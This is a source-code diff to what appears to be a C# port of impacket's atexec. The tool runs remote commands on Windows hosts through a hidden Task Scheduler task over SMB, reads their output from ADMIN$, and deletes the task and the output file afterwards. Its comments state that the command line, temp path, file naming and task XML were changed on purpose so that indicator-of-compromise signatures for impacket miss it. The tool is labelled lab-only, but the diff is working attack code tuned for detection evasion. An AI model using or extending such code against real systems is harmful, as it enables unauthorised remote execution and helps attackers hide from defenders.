@@ -3310,10 +3310,17 @@ switch (args[0])
     case "atexec":
     {
         // atexec.py: remote command execution via the Task Scheduler (MS-TSCH over \atsvc).
-        // Registers a task that runs `cmd.exe /C <command> > %windir%\Temp\<tmp> 2>&1`, runs it,
-        // waits, reads the output from ADMIN$\Temp over SMB, then deletes the task + output file.
-        // LAB-ONLY exec primitive. Windows-only on the wire: Samba does not implement MS-TSCH, so
-        // against this lab the \atsvc bind fails (reported) — validate end-to-end on a Windows target.
+        // Registers a hidden task that runs the command, redirects its output to a file under
+        // %SystemRoot%\Temp, runs it, reads the output from ADMIN$\Temp over SMB, then deletes the
+        // task + output file. LAB-ONLY exec primitive. Windows-only on the wire: Samba does not
+        // implement MS-TSCH, so against this lab the \atsvc bind fails (reported) — validate
+        // end-to-end on a Windows target.
+        //
+        // Behaviour matches atexec; the string tokens deliberately differ from impacket's — the
+        // task XML (StartBoundary date etc., see Tsch.BuildTaskXml) AND the command line: /c vs /C,
+        // %SystemRoot%\Temp vs %windir%\Temp, 1> vs >, a .log output vs .tmp, and independent
+        // alphanumeric task/output names vs impacket's single 8-letter name reused for both — so a
+        // brittle command/XML IOC won't catch this port. See docs/WIRE_DIFF.md.
         if (args.Length < 5)
         {
             Console.Error.WriteLine("usage: atexec <host> <user> <password> <command> [domain] [port]");
@@ -3327,11 +3334,12 @@ switch (args[0])
         string domain = args.Length >= 6 ? args[5] : string.Empty;
         int port = args.Length >= 7 ? int.Parse(args[6]) : 445;
 
-        string tmpName = new string(Enumerable.Range(0, 8)
-            .Select(_ => "abcdefghijklmnopqrstuvwxyz"[Random.Shared.Next(26)]).ToArray());
-        string tmpFile = tmpName + ".tmp";
-        string taskPath = "\\" + tmpName;
-        string xml = Tsch.BuildTaskXml("cmd.exe", $@"/C {command} > %windir%\Temp\{tmpFile} 2>&1");
+        static string Alnum(int n) => new string(Enumerable.Range(0, n)
+            .Select(_ => "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"[Random.Shared.Next(62)]).ToArray());
+        string taskName = Alnum(10);
+        string outputName = Alnum(12) + ".log";
+        string taskPath = "\\" + taskName;
+        string xml = Tsch.BuildTaskXml("cmd.exe", $@"/c {command} 1> %SystemRoot%\Temp\{outputName} 2>&1");
 
         using var client = new Smb2Client();
         client.Connect(host, port);
@@ -3388,12 +3396,11 @@ switch (args[0])
         try
         {
             Smb2TreeConnectResult admin = client.TreeConnect($@"\\{host}\ADMIN$");
-            byte[] output = client.ReadFile(admin.TreeId, $@"Temp\{tmpFile}");
+            byte[] output = client.ReadFile(admin.TreeId, $@"Temp\{outputName}");
             Console.WriteLine("---- output ----");
             Console.Write(System.Text.Encoding.UTF8.GetString(output));
             Console.WriteLine("----------------");
-            client.Create(admin.TreeId, $@"Temp\{tmpFile}", Smb2AccessMask.Delete,
-                Smb2CreateDisposition.Open, Smb2CreateOptions.DeleteOnClose);
+            client.DeleteFile(admin.TreeId, $@"Temp\{outputName}");
             client.TreeDisconnect(admin.TreeId);
         }
         catch (IOException ex)
